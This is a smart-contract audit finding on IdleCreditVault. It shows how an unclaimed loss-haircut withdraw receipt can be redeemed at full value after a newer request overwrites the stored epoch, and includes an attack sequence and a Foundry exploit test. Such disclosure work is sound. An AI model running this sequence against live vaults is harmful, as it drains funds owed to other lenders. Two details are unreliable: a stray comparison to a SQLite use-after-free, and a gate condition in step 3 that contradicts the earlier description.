### Title
Stale `lastWithdrawRequest` skips loss haircut on older receipt, letting a user claim an underfunded loss-adjusted withdraw at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` locates a user's loss-adjusted receipt by reading `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, i.e. it only ever inspects the *latest* request epoch. `requestWithdraw` overwrites `lastWithdrawRequest[_user]` on every new request, while the loss-adjusted basis of the older epoch remains inside the aggregate `withdrawsRequests[_user]`. A user who lets a haircut receipt sit unclaimed and then files a second withdraw request causes the haircut lookup to point at the new (non-loss) epoch, so the stale receipt is paid out at full basis through `_claimFundedWithdrawRequest` even though the borrower only funded `claimBasis * lossRecoveryPrice / RECOVERY_FULL` for it. This is the credit-vault analog of the SQLite use-after-free: a stale epoch pointer causes freed/outdated accounting state to be treated as valid, paying out more than was funded.

### Finding Description
- In `requestWithdraw`, every new request sets `lastWithdrawRequest[_user] = currentEpoch` and accumulates `withdrawsRequests[_user] += _amount` plus `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount` (`IdleCreditVault.sol:282-293`). Nothing merges or re-prices the previous epoch's pending receipt.
- On a `stopEpochWithDuration` loss, `collectWithdrawFunds` is called with `_amount < pendingBasis`, stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, zeroes `pendingWithdraws`, and pulls only the reduced `_amount` into the vault (`IdleCreditVault.sol:411-430`).
- On claim, `claimWithdrawRequest` calls `_claimLossAdjustedWithdrawRequest`, which computes `lossEpoch = lastWithdrawRequest[_user]` and returns early when `lossRecoveryPriceByEpoch[lossEpoch] == 0` (`IdleCreditVault.sol:789-801`). Only the *latest* epoch is ever checked for a haircut.
- `_claimFundedWithdrawRequest` then pays `amount = withdrawsRequests[_user] (+ apr0 buckets)` at par via `_transferFundedClaim`, gated only by `epochNumber > lastWithdrawRequest[_user]` (`IdleCreditVault.sol:319-349`).

Attack sequence (unprivileged lender, running/buffer phases, normal mode):
1. Epoch E: user requests withdraw of basis B1. Manager stops epoch with a loss; borrower funds `B1 * p / RECOVERY_FULL` (p = e.g. 0.5). `lossRecoveryPriceByEpoch[E] = p`.
2. User does not claim. In epoch F (after redepositing), user requests withdraw of B2. `lastWithdrawRequest[user]` is overwritten to F.
3. Epoch F ends fully funded; `epochNumber` becomes F+1, so the gate `epochNumber <= lastWithdrawRequest` passes.
4. `claimWithdrawRequest`: `lossRecoveryPriceByEpoch[F] == 0` → haircut path skipped; funded path burns the receipts and transfers `B1 + B2` underlying. The vault only ever received `B1*p/R + B2` for those receipts, so `B1*(R - p)/R` is paid out of funds belonging to other claimants/holders.

The per-epoch map `withdrawsRequestsByEpoch` retains the E-basis, but no code path iterates prior epochs for a haircut once `lastWithdrawRequest` has moved on — the epoch-E receipt is a dangling record redeemed at par.

### Impact Explanation
Direct insolvency/theft of `B1 * (RECOVERY_FULL - lossRecoveryPriceByEpoch[E]) / RECOVERY_FULL` underlying per affected receipt. The vault pays the full pre-loss basis for a receipt that was only funded at the haircut price, draining the strategy's underlying reserve that backs other funded withdraw claims and default-recovery claimants. With a 50% recovery price the attacker extracts half the receipt basis in excess of what was funded; the loss is bounded only by the size of the attacker-controlled receipt. The broken invariants are the loss waterfall (a loss-adjusted receipt escapes its haircut) and one-receipt-one-payout (a receipt paid at a price that was never collected).

### Likelihood Explanation
Requires only ordinary user actions available to any KYC-passed lender: request a withdraw, wait through a `stopEpochWithDuration` loss epoch without claiming, then make a new deposit/withdraw request and claim after the next epoch. Delaying claims is explicitly supported behavior ("user can withdraw at any time even if a new epoch started"). The trigger requires a realized loss epoch (`stopEpochWithDuration` with `_lossAmount > 0`), which is an honest-manager operation, so the attacker cannot force it — but any loss epoch converts all unclaimed receipts into exploitable overdraw, and every subsequent request the user makes permanently orphans the haircut record. No privileged misbehavior is needed.

### Recommendation
In `_claimLossAdjustedWithdrawRequest` (and the claim path generally), do not rely solely on `lastWithdrawRequest[_user]` as the loss epoch. Either:
- iterate/check all epochs with nonzero `withdrawsRequestsByEpoch[_user][epoch]` where `lossRecoveryPriceByEpoch[epoch] != 0` before paying the funded remainder at par, or
- on `requestWithdraw`, first settle/clear any prior loss-adjusted receipt for the user (pay it at its haircut price or roll it into a haircut-preserving bucket) before overwriting `lastWithdrawRequest[_user]`.

A minimal fix is to check `lossRecoveryPriceByEpoch` for every epoch recorded in `withdrawsRequestsByEpoch[_user]` during claim, applying each epoch's own recovery price, and only route the remaining basis to `_claimFundedWithdrawRequest`.

### Proof of Concept
Foundry fork test outline (extend `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testStaleLossReceiptPaidAtPar() external {
    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);          // attacker deposit
    _startEpochAndCheckPrices(0);

    // Epoch E: request withdraw of B1
    uint256 tranches = IERC20(AAtranche).balanceOf(address(this));
    uint256 b1 = cdoEpoch.requestWithdraw(tranches / 2, address(AAtranche));
    uint256 lossEpoch = strategy.epochNumber();

    // stopEpochWithDuration with loss -> lossRecoveryPriceByEpoch[lossEpoch] = p < RECOVERY_FULL
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 activeBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 totalBasis = activeBasis + pendingBasis;
    uint256 recovery = totalBasis / 2;                 // ~50% recovery
    uint256 lossAmount = totalBasis - recovery;
    (uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialApr, 0, cdoEpoch.epochDuration(), lossAmount);
    assertLt(strategy.lossRecoveryPriceByEpoch(lossEpoch), RECOVERY_FULL);

    // Attacker does NOT claim. Next epoch: deposit again and file a second withdraw request.
    vm.prank(manager);
    cdoEpoch.startEpoch();
    idleCDO.depositAA(amount);                        // re-enter pool
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // buffer of next epoch: new request overwrites lastWithdrawRequest
    uint256 b2 = cdoEpoch.requestWithdraw(tranches / 2, address(AAtranche));
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = strategy.pendingWithdraws();
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pending);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), cdoEpoch.expectedEpochInterest() + pending);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);                          // epoch F fully funded

    // Claim: haircut on epoch-E receipt is skipped because
    // lossRecoveryPriceByEpoch[lastWithdrawRequest] == 0.
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(address(this)) - balPre;

    uint256 haircutPaid = b1 * strategy.lossRecoveryPriceByEpoch(lossEpoch) / RECOVERY_FULL;
    assertGt(paid, haircutPaid + b2, 'loss-adjusted receipt was paid at par');
}
```

Expected result: `paid == b1 + b2` (full basis) while the vault collected only `b1 * p / RECOVERY_FULL + b2`, demonstrating an excess payout of `b1 * (RECOVERY_FULL - p) / RECOVERY_FULL` drained from the strategy reserve.
